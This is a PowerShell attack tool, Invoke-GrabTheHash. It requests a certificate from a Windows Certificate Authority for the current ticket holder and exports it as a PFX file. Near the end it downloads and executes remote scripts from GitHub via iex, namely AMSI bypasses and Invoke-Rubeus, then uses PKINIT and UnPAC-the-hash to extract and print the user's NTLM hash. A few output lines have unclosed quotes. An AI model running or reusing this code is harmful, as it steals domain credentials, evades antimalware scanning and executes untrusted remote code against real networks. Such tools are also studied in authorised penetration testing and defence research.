<#
.SYNOPSIS
Requests a certificate from a Windows Certificate Authority (CA) on behalf of the user for whom a Ticket Granting Ticket (TGT) is held in the current session, uses PKINIT to obtain a TGT for the same user, then performs the UnPAC the Hash technique to extract the user's NTLM hash
#>

function Invoke-GrabTheHash
{

	[CmdletBinding()]
	Param(
		[Parameter(Mandatory=$False,ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True)]
		[string]$CN,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[String]$TemplateName = "User",
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[string]$CAName,
  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[string]$Domain,
  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[switch]$CertTemplates
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	Write-Host ""

 	if($Domain){
		$currentDomain = $Domain
	}
	else{
		try{
  			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
			$currentDomain = $currentDomain.Name
  		}
    		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}

		Write-Host "Domain switch not provided. Target Domain will be set to: $currentDomain"
  		Write-Host "
	}

 	if($CertTemplates){

		Write-Host "Certificate Templates:"
  		Write-Host "

  		try{
  
	  		$domainDistinguishedName = "DC=" + ($currentDomain -replace "\.", ",DC=")
	  		$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
			$ldapConnection.Path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDistinguishedName"
			$ldapConnection.AuthenticationType = "None"
			
			$searcher = New-Object System.DirectoryServices.DirectorySearcher
			$searcher.SearchRoot = $ldapConnection
			$searcher.Filter = "(objectClass=pKICertificateTemplate)"
			$searcher.SearchScope = "Subtree"
			
			$results = $searcher.FindAll()
			
			foreach ($result in $results) {
			    $templateName = $result.Properties["name"][0]
			    Write-Host "$templateName"
			}
			
			# Dispose resources
			$results.Dispose()
			$searcher.Dispose()
			$ldapConnection.Dispose()
   		}

     		catch{
       			$AllTemplates = certutil -template
	  		$AllTemplates -split "`n" | Where-Object { $_ -match 'TemplatePropCommonName' } | ForEach-Object { $_.Replace('TemplatePropCommonName = ', '').Trim() }
		}

  		break
	}
	
	if(!$CAName){
		$CertutilDump = certutil
		$CertutilDump = ($CertutilDump | Out-String) -split "`n"
		$CertutilDump = $CertutilDump.Trim()
		$CertutilDump = $CertutilDump | Where-Object { $_ -ne "" }
		$caNames = $CertutilDump | Where-Object { $_ -match "Config:\s*(.*)" } | ForEach-Object { $matches[1] }
	}
	
	if(!$CN){
		$KlistDump = klist
		$clientNames = $KlistDump | Where-Object { $_ -match "Client:\s*([\w.]+)\s*@" } | ForEach-Object { $matches[1] }
		$CN = $clientNames | Sort -Unique
	}
	
	function Remove-ReqTempfiles()
	{
		param(
			[String[]]$tempfiles
		)
		
		$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'CurrentUser')
		$certstore.Open('ReadWrite')
		foreach($certreq in $($certstore.Certificates))
		{
			if($certreq.Subject -eq "CN=$CN")
			{
				$certstore.Remove($certreq)
			}
		}
		$certstore.close()
		
		foreach($file in $tempfiles){remove-item ".\$file" -ErrorAction silentlycontinue}
	}

	if($PSBoundParameters['Debug']){$DebugPreference = "Continue"}
	
	Write-Host "Requesting certificate with subject $CN"
	Write-Debug "Parameter values: CN = $CN, TemplateName = $TemplateName, CAName = $CAName"
	
	Write-Verbose "Generating request inf file"
	$file = @"
[NewRequest]
Subject = "CN=$CN"
KeyLength = 2048
KeySpec=1
Exportable = TRUE
RequestType = PKCS10
[RequestAttributes]
CertificateTemplate = "$TemplateName"
"@        

	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
	Set-Content .\certreq.inf $file
	Get-Content .\certreq.inf | Write-Verbose

	try    {
		Invoke-Expression -Command "certreq -new -q certreq.inf certreq.req" >$null 2>&1
		if(!($LastExitCode -eq 0))
		{
			Write-Host "Certificate request failed"
			Write-Host ""
			break
		}
	   
		if($CAName){	
			Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
		}
		else{
			$success = $false
			foreach($CAName in $caNames){
				try{
					Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
					if($LASTEXITCODE -eq 0) {
						$success = $true
						break
					}
				}
				catch{continue}
			}
			
			if(-not $success){
				Invoke-Expression -Command "certreq -submit certreq.req $CN.cer" >$null 2>&1
			}
		}
		
		if(!($LastExitCode -eq 0))
		{
			throw "certreq -submit command failed"
		}

		Invoke-Expression -Command "certreq -accept -q $CN.cer" >$null 2>&1

		if(!($LastExitCode -eq 0))
		{
			throw "certreq -accept command failed"
		}

		if(($LastExitCode -eq 0) -and ($? -eq $true))
		{}
		
		else
		{
			throw "Request failed with unkown error"
		}

		$cert = Get-Childitem "cert:\CurrentUser\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}

		$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)

		$certbytes | Set-Content -Encoding Byte  -Path "$CN.pfx" -ea Stop
		Write-Host "Certificate successfully exported to $CN.pfx"
		
		$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')
		$certstore.Open('ReadWrite')
		$certstore.Remove($cert)
		$certstore.close() 
	}
	catch {
		Write-Error $_
	}
	finally {
		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
	}
	
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
	
	$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
	
	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
		$ntlmValue = $Matches[1]
		Write-Host "$CN NTLM hash: $ntlmValue"
		Write-Host ""
	}
}
